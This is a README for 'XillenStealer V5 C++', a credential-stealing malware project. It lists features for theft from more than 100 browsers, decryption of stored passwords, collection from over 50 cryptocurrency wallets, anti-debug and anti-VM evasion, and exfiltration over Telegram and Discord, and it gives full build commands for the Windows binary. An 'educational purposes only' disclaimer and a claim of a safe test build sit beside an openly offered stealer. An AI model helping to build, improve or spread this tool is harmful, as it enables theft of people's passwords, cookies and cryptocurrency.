# XillenStealer V5 C++ - Ultimate Edition

Ultimate C++ implementation with 100+ browsers, full DPAPI/SQLite decryption, complete collectors suite.

## Features

- 100+ Browser Support (Chromium, Firefox, Safari, etc.)
- Full DPAPI Decryption
- SQLite Database Parsing
- 50+ Wallet Collectors
- Gaming Platform Support
- Enterprise Data Collection
- Advanced Evasion (Anti-Debug, Anti-VM)
- Crypto Modules (AES-256-GCM, ChaCha20, SHA256)
- Memory Operations (Encryption, Wiping, Archiving)
- HTTP Exfiltration (Telegram, Discord, File Upload)

## Build Instructions

### Prerequisites

- MinGW-w64 (g++ compiler)
- Windows 10/11

### Build

Run the build script:

```batch
build_v5.bat
```

### Manual Build

```batch
g++ -o test_data_collector.exe ^
  src\core\*.cpp ^
  src\evasion\*.cpp ^
  src\collectors\*.cpp ^
  src\crypto\*.cpp ^
  src\memory\*.cpp ^
  src\utils\*.cpp ^
  src\external\sqlite3.c ^
  -lwininet -lwinhttp -lcrypt32 -liphlpapi -lpsapi -lshell32 -lshlwapi ^
  -O3 -s -static -mwindows -std=c++20
```

## Testing

The build creates `test_data_collector.exe` - a safe testing version that:
- Does NOT send data
- Does NOT install to autostart
- Only collects and displays data

Run manually: `test_data_collector.exe`

## Project Structure

```
src/
├── core/           Main stealer logic
├── evasion/        Anti-analysis techniques
├── collectors/     Data collection modules
├── crypto/         Encryption/decryption
├── memory/         Memory operations
├── utils/          Helper utilities
└── external/       SQLite library
```

## WARNING

This is for educational purposes only. Do not use for illegal activities.
